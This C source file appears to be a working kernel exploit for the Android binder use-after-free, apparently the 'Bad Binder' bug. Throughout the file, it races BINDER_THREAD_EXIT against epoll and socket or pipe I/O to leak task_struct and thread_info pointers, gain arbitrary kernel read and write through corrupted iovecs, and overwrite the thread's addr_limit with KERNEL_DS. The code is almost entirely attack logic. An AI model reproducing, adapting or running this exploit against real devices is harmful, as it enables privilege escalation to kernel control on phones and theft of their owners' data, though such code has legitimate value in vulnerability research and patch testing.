#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/epoll.h>
#include <sys/socket.h>

#include "bad_binder.h"


static int32_t try_write_kernel_memory(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pWriteAddr, uint64_t uiWriteSz, void* pSourceBuff)
{
    int32_t iRet = -1;
    uint64_t overwrite_iovec[7] = {0};
    uint32_t uiInitWriteSz = sizeof(overwrite_iovec);
    uint32_t uiTotalWriteSz = uiInitWriteSz + uiWriteSz + sizeof(uint64_t);
    char* pDataBuff = NULL;
    struct iovec iovec_array[BINDER_IOVEC_ARRAY_SZ] = {{0}};
    struct msghdr iovec_msg = {0};
    uint64_t ulTestMagic = TEST_WRITE_MAGIC;
    int32_t iSockFd[2] = {0};
    uint32_t uiMaxThreads = 2;
    struct epoll_event epoll_ev = { .events = EPOLLIN };
    pid_t pid_child = -1;

    pDataBuff = (char*)malloc(uiTotalWriteSz);

    if(NULL == pDataBuff)
    {
        printf("[-] failed to allocate memory!\n");
        goto done;
    }

    overwrite_iovec[0] = 0x1;
    overwrite_iovec[1] = 0x13371337;
    overwrite_iovec[2] = uiInitWriteSz;
    overwrite_iovec[3] = pWriteAddr;
    overwrite_iovec[4] = uiWriteSz;
    overwrite_iovec[5] = (uint64_t)pDummyBuff;
    overwrite_iovec[6] = sizeof(uint64_t);

    iovec_array[BINDER_IOVEC_INDX_WQ].iov_base = pDummyBuff;
    iovec_array[BINDER_IOVEC_INDX_WQ].iov_len = 0x1; 
    iovec_array[BINDER_IOVEC_INDX_WQ + 1].iov_base = (void *)0x13371337;     
    iovec_array[BINDER_IOVEC_INDX_WQ + 1].iov_len = uiInitWriteSz;
    iovec_array[BINDER_IOVEC_INDX_WQ + 2].iov_base = (void *)0x13371337;
    iovec_array[BINDER_IOVEC_INDX_WQ + 2].iov_len = uiWriteSz;
    iovec_array[BINDER_IOVEC_INDX_WQ + 3].iov_base = (void*)0x13371337;
    iovec_array[BINDER_IOVEC_INDX_WQ + 3].iov_len = sizeof(uint64_t);

    iovec_msg.msg_iov = iovec_array;
    iovec_msg.msg_iovlen = BINDER_IOVEC_ARRAY_SZ;

    memset(pDataBuff, 0, uiTotalWriteSz);
    memcpy(pDataBuff, &overwrite_iovec, uiInitWriteSz);
    memcpy(pDataBuff + uiInitWriteSz, pSourceBuff, uiWriteSz);
    memcpy(pDataBuff + uiInitWriteSz + uiWriteSz, &ulTestMagic, sizeof(uint64_t));

    if(0 != socketpair(AF_UNIX, SOCK_STREAM, 0, iSockFd))
    {
        printf("[-] failed to pair sockets!\n");
        goto done;
    }

    if(0 != ioctl(iBinderFd, BINDER_SET_MAX_THREADS, &uiMaxThreads))
    {
        printf("[-] binder set max threads ioctl failed!\n");
        goto done;
    }

    if(0 != epoll_ctl(iEpFd, EPOLL_CTL_ADD, iBinderFd, &epoll_ev))
    {
        printf("[-] failed to add binder fd to the epoll fd table!\n");
        goto done;
    }

    if(0x1 != write(iSockFd[1], "\x33", 0x1))
    {
        printf("[-] failed to write dummy byte to socket!");
        goto done;
    }

    pid_child = fork();

    if(0 == pid_child)
    {
        close(iSockFd[0]);
        iSockFd[0] = -1;

        // Sleep long enough for parent process to complete the BINDER_EXIT_THREAD ioctl and initiate the readv system call.
        // This will trigger the freeing/reallocation of the UAF memory in preparation for the reuse triggered by the child.
        usleep(CHILD_SLEEP);

        if(0 != epoll_ctl(iEpFd, EPOLL_CTL_DEL, iBinderFd, &epoll_ev))
        {
            printf("[-] failed to delete binder fd from the epoll fd table!\n");
            goto done;
        }

        if(uiTotalWriteSz != write(iSockFd[1], pDataBuff, uiTotalWriteSz))
        {
            printf("[-] failed to overwrite_iovec data to socket!\n");
        }

        goto done;
    }

    close(iSockFd[1]);
    iSockFd[1] = -1;
    
    if(0 != ioctl(iBinderFd, BINDER_THREAD_EXIT, NULL))
    {
        printf("[-] binder thread exit ioctl failed!\n");
        goto done;
    }

    if(uiTotalWriteSz >= recvmsg(iSockFd[0], &iovec_msg, MSG_WAITALL))
    {
        printf("[-] failed to write data at given write address!\n");
        goto done;
    }

    waitpid(pid_child, NULL, 0);

    if(TEST_WRITE_MAGIC != *(unsigned long*)pDummyBuff)
    {
        printf("[-] invalid magic value for test write!\n");
        goto done;
    }

    iRet = 0;

done:

    if(NULL != pDataBuff)
    {
        free(pDataBuff);
        pDataBuff = NULL;
    }

    if(0 < iSockFd[0])
    {
        close(iSockFd[0]);
        iSockFd[0] = -1;
    }

    if(0 < iSockFd[1])
    {
        close(iSockFd[1]);
        iSockFd[1] = -1;
    }

    if(0 == pid_child)
    {
        exit(0);
    }

    return iRet;
}

static int32_t write_kernel_memory(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pWriteAddr, uint64_t uiWriteSz, void* pSourceBuff)
{
    int32_t iRet = -1;

    for(int32_t i = 0; i < MAX_UAF_RETRY; i++)
    {
        if(0 == try_write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pWriteAddr, uiWriteSz, pSourceBuff))
        {
            iRet = 0;
            break;
        }
    }

    return iRet;
}

static int32_t try_leak_kernel_memory(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pLeakAddr, uint32_t uiLeakSz, void* pLeakRecvBuff, uint64_t* ppTaskStruct)
{
    int32_t iRet = -1;
    uint32_t uiDummyRdSz = PAGE_SIZE;
    uint32_t uiTaskLeakSz = PAGE_SIZE;
    uint32_t uiTotalLeakSz = 2*uiDummyRdSz + uiTaskLeakSz + uiLeakSz;
    char* pDataBuff = MAP_FAILED;
    char* pLeakData = NULL;
    uint64_t* ppIovecArray = NULL;
    uint64_t* ppTaskStructTemp = NULL;
    struct iovec iovec_array[BINDER_IOVEC_ARRAY_SZ] = {{0}};
    uint64_t overwrite_iovec[7] = {0};
    int32_t iPipeFd[2] = {0};
    uint32_t uiMaxThreads = 2;
    struct epoll_event epoll_ev = { .events = EPOLLIN };
    pid_t pid_child = -1;

    pDataBuff = (char*)mmap(NULL, uiTotalLeakSz, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);

    if(MAP_FAILED == pDataBuff)
    {
        printf("[-] failed to create shared memory map!\n");
        goto done;
    }

    pLeakData = pDataBuff + uiTaskLeakSz;
    ppIovecArray = (uint64_t*)pDataBuff;
    ppTaskStructTemp = (uint64_t*)(pDataBuff + TASK_BINDER_THREAD_OFFSET - (WAITQUEUE_BINDER_THREAD_OFFSET + 0x8));

    iovec_array[BINDER_IOVEC_INDX_WQ].iov_base = pDummyBuff;
    iovec_array[BINDER_IOVEC_INDX_WQ].iov_len = uiDummyRdSz;
    iovec_array[BINDER_IOVEC_INDX_WQ + 1].iov_base = (void *)0x13371337;
    iovec_array[BINDER_IOVEC_INDX_WQ + 1].iov_len = uiTaskLeakSz;
    iovec_array[BINDER_IOVEC_INDX_WQ + 2].iov_base = pDummyBuff;
    iovec_array[BINDER_IOVEC_INDX_WQ + 2].iov_len = uiDummyRdSz;
    iovec_array[BINDER_IOVEC_INDX_WQ + 3].iov_base = (void *)0x13371337;
    iovec_array[BINDER_IOVEC_INDX_WQ + 3].iov_len = uiLeakSz;

    if(0 != pipe(iPipeFd))
    {
        printf("[-] failed to create pipes!\n");
        goto done;
    }

    if(0 != pipe(iPipeFd))
    {
        printf("[-] failed to create pipes!\n");
        goto done;
    }

    if(PAGE_SIZE != fcntl(iPipeFd[0], F_SETPIPE_SZ, PAGE_SIZE))
    {
        printf("[-] failed to set pipe size!\n");
        goto done;
    }

    if(PAGE_SIZE != fcntl(iPipeFd[1], F_SETPIPE_SZ, PAGE_SIZE))
    {
        printf("[-] failed to set pipe size!\n");
        goto done;
    }

    if(0 != ioctl(iBinderFd, BINDER_SET_MAX_THREADS, &uiMaxThreads))
    {
        printf("[-] binder set max threads ioctl failed!\n");
        goto done;
    }

    if(0 != epoll_ctl(iEpFd, EPOLL_CTL_ADD, iBinderFd, &epoll_ev))
    {
        printf("[-] failed to add binder fd to the epoll fd table!\n");
        goto done;
    }

    pid_child = fork();

    if(-1 == pid_child)
    {
        printf("[-] failed to fork process!\n");
        goto done;
    }

    if(0 == pid_child)
    {
        close(iPipeFd[1]);
        iPipeFd[1] = -1;

        usleep(CHILD_SLEEP);

        if(0 != epoll_ctl(iEpFd, EPOLL_CTL_DEL, iBinderFd, &epoll_ev))
        {
            printf("[-] failed to delete binder fd from the epoll fd table!\n");
            goto done;
        }
        
        if(uiDummyRdSz != read(iPipeFd[0], pDataBuff, uiDummyRdSz))
        {
            printf("[-] failed to read dummy data!\n");
            goto done;
        }

        if(uiTaskLeakSz != read(iPipeFd[0], pDataBuff, uiTaskLeakSz))
        {
            printf("[-] failed to read the initial leak!\n");
            *ppTaskStructTemp = 0;
            goto done;
        }

        if(0 != pLeakAddr)
        {
            if(!IS_KERNEL_POINTER(*ppIovecArray))
            {
                printf("[-] leaked data is not in expected format!\n");
                *ppTaskStructTemp = 0;
                goto done;
            }

            overwrite_iovec[0] = uiDummyRdSz;
            overwrite_iovec[1] = 0x13371337;
            overwrite_iovec[2] = 0;
            overwrite_iovec[3] = (uint64_t)pDummyBuff;
            overwrite_iovec[4] = 0;
            overwrite_iovec[5] = pLeakAddr;
            overwrite_iovec[6] = uiLeakSz;

            if(0 != write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, *ppIovecArray, sizeof(overwrite_iovec), &overwrite_iovec))
            {
                printf("[-] failed to overwrite iovec_array to leak memory at address!\n");
                *ppTaskStructTemp = 0;
                goto done;
            }
        }

        if(uiDummyRdSz != read(iPipeFd[0], pDummyBuff, uiDummyRdSz))
        {
            printf("[-] failed to read dummy data!\n");
            goto done;
        }

        if(0 < uiLeakSz)
        {
            if(uiLeakSz != read(iPipeFd[0], pLeakData, uiLeakSz))
            {
                printf("[-] failed to read leaked data!\n");
                *ppTaskStructTemp = 0;
            }
        }

        goto done;
    }

    close(iPipeFd[0]);
    iPipeFd[0] = -1;

    if(0 != ioctl(iBinderFd, BINDER_THREAD_EXIT, NULL))
    {
        printf("[-] binder thread exit ioctl failed!\n");
        goto done;
    }

    if(uiTotalLeakSz != writev(iPipeFd[1], iovec_array, BINDER_IOVEC_ARRAY_SZ))
    {
        printf("[-] failed to leak memory!\n");
        goto done;
    }

    waitpid(pid_child, NULL, 0);

    if(!IS_KERNEL_POINTER(*ppTaskStructTemp))
    {
        printf("[-] error, leaked data doesn't seem right...\n");
        goto done;
    }

    *ppTaskStruct = *ppTaskStructTemp;

    if(0 < uiLeakSz)
    {
        memcpy(pLeakRecvBuff, pLeakData, uiLeakSz);
    }

    iRet = 0;

done:

    if(MAP_FAILED != pDataBuff)
    {
        munmap(pDataBuff, uiTotalLeakSz);
        pDataBuff = MAP_FAILED;
    }

    if(0 < iPipeFd[0])
    {
        close(iPipeFd[0]);
        iPipeFd[0] = -1;
    }

    if(0 < iPipeFd[1])
    {
        close(iPipeFd[1]);
        iPipeFd[1] = -1;
    }

    if(0 == pid_child)
    {
        exit(0);
    }

    return iRet;
}

static int32_t leak_kernel_memory(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pLeakAddr, uint32_t uiLeakSz, void* pLeakRecvBuff, uint64_t* ppTaskStruct)
{
    int32_t iRet = -1;

    for(int32_t i = 0; i < MAX_UAF_RETRY; i++)
    {
        if(0 == try_leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pLeakAddr, uiLeakSz, pLeakRecvBuff, ppTaskStruct))
        {
            iRet = 0;
            break;
        }
    }

    return iRet;
}

static int32_t find_thread_info(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pTaskStruct, uint64_t* ppThreadInfo)
{
    int32_t iRet = -1;
    uint64_t pulAddrLimit = 0;
    uint64_t ulAddrLimit = 0;
    uint64_t pThreadKstack = 0;

    pulAddrLimit = pTaskStruct + THREAD_INFO_TASK_OFFSET + ADDR_LIMIT_THREAD_INFO_OFFSET;

    if(0 != leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pulAddrLimit, sizeof(uint64_t), &ulAddrLimit, &pTaskStruct))
    {
        printf("[-] failed to leak memory at task_struct offset!\n");
        goto done;
    }

    if(USER_DS != ulAddrLimit)
    {
        // Some kernels randomize the location of thread_info in the thread's kernel stack
        // We search for it here. It might take a minute, so be patient :). 

        printf("[!] thread_info not in task_struct!\n");
         
        if(0 != leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pTaskStruct + KSTACK_TASK_OFFSET, sizeof(uint64_t), &pThreadKstack, &pTaskStruct))
        {
            printf("[-] failed to leak memory at task_struct offset!");
            goto done;
        }

        printf("[!] searching kernel stack for thread_info...\n");

        for(int32_t i = 0; i < (THREAD_KSTACK_SIZE/0x8); i++)
        {
            if(0 != leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pThreadKstack + i*sizeof(uint64_t), sizeof(uint64_t), &ulAddrLimit, &pTaskStruct))
            {
                printf("[-] failed to leak kstack memory!\n");
                goto done;
            }

            if(USER_DS == ulAddrLimit)
            {
                *ppThreadInfo = pThreadKstack + (i-1)*ADDR_LIMIT_THREAD_INFO_OFFSET;
                iRet = 0;
                break;
            }
        }
    }

    else
    {
        *ppThreadInfo = pTaskStruct + THREAD_INFO_TASK_OFFSET;
        iRet = 0;
    }

done:
    return iRet;
}

int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo)
{
    int32_t iRet = -1;
    int32_t iBinderFd = -1;
    int32_t iEpFd = -1;
    uint64_t pDummyMapBaseAddr = ((uint64_t)UAF_SPINLOCK << 16) & 0xFFFFFFFFFFF00000;
    void* pDummyBuff = MAP_FAILED;
    uint64_t pTaskStruct = 0;
    uint64_t pThreadInfo = 0;
    uint64_t pAddrLimit = 0;
    uint64_t ulNewAddrLimit = KERNEL_DS;

    iBinderFd = open("/dev/binder", O_RDONLY);

    if(0 > iBinderFd)
    {
        printf("[-] failed to open binder device!\n");
        goto done;
    }

    iEpFd = epoll_create(1000);

    if(0 > iEpFd)
    {
        printf("[-] failed to create epoll instance!\n");
        goto done;
    }

    pDummyBuff = mmap((void*)pDummyMapBaseAddr, 2*UAF_SPINLOCK, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    if((uint64_t)pDummyBuff != pDummyMapBaseAddr)
    {
        printf("[-] failed to create aligned memory map!\n");
        goto done;
    }

    if(0 != leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, 0, 0, NULL, &pTaskStruct))
    {
        printf("[-] failed to leak current thread's task_struct :(\n");
        goto done;
    }

    printf("[+] leaked task_struct ptr: %lx\n", pTaskStruct);

    if(0 != find_thread_info(iBinderFd, iEpFd, pDummyBuff, pTaskStruct, &pThreadInfo))
    {
        printf("[-] failed to find address of thread_info struct!\n");
        goto done;
    }

    printf("[+] found thread_info ptr: %lx\n", pThreadInfo);
    printf("[!] attempting to overwrite addr_limit...\n");

    pAddrLimit = pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET;

    if(0 != write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pAddrLimit, sizeof(uint64_t), &ulNewAddrLimit))
    {
        printf("[-] failed to overwrite current thread's address limit!\n");
        goto done;
    }

    *ppTaskStruct = pTaskStruct;
    *ppThreadInfo = pThreadInfo;

    iRet = 0;

done:

    if(0 < iEpFd)
    {
        close(iEpFd);
        iEpFd = -1;
    }

    if(0 < iBinderFd)
    {
        close(iBinderFd);
        iBinderFd = -1;
    }

    if(MAP_FAILED != pDummyBuff)
    {
        munmap(pDummyBuff, 2*UAF_SPINLOCK);
        pDummyBuff = MAP_FAILED;
    }

    return iRet;
}